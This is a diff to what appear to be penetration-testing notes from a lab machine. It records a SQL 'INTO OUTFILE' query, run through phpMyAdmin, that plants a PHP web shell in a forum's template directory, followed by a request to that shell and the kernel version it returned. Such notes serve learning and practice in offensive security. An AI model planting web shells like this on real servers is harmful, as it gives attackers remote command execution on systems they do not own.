@@ -166,3 +166,6 @@ https://planet.mysql.com/entry/?id=15894
 
 # Ok we have acces to phpmyadmin so we can make an sql injection to create a file in templates_c and reverse shell
 SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/forum/templates_compiled/shell.php"
+
+# https://192.168.1.132/forum//templates_c/shell.php?cmd=cat%20/proc/version
+Linux version 3.2.0-91-generic-pae (buildd@lgw01-15) (gcc version 4.6.3 (Ubuntu/Linaro 4.6.3-1ubuntu5) ) #129-Ubuntu SMP Wed Sep 9 11:27:47 UTC 2015
